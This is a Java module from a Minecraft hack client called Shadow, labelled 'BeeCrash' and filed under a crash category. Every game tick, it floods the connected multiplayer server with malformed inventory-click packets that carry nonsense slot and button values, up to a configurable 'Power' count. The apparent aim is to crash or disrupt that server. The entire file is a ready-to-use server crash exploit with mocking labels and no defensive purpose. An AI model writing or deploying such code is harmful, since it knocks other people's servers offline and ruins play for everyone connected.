package net.shadow.feature.module;

import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.world.World;
import net.shadow.Shadow;
import net.shadow.feature.base.Module;
import net.shadow.feature.base.ModuleType;
import net.shadow.feature.configuration.SliderValue;

public class ErrorCrash extends Module {
    static World w;
    final SliderValue pwr = this.config.create("Power", 11, 1, 30, 0);

    public ErrorCrash() {
        super("BeeCrash", "the funny crash", ModuleType.CRASH);
    }

    @Override
    public void onEnable() {
        w = Shadow.c.player.clientWorld;
    }

    @Override
    public void onDisable() {
    }

    @Override
    public void onUpdate() {
        if (w != Shadow.c.player.clientWorld) {
            this.setEnabled(false);
            return;
        }
        Int2ObjectMap<ItemStack> ripbozo = new Int2ObjectArrayMap();
        ripbozo.put(0, new ItemStack(Items.ACACIA_BOAT, 1));
        for (int i = 0; i < pwr.getThis(); i++) {
            Shadow.c.player.networkHandler.sendPacket(new ClickSlotC2SPacket(Shadow.c.player.currentScreenHandler.syncId, 123344, 2957234, 1, SlotActionType.PICKUP, new ItemStack(Items.ACACIA_BOAT, 1), ripbozo));
        }
    }

    @Override
    public void onRender() {

    }
}
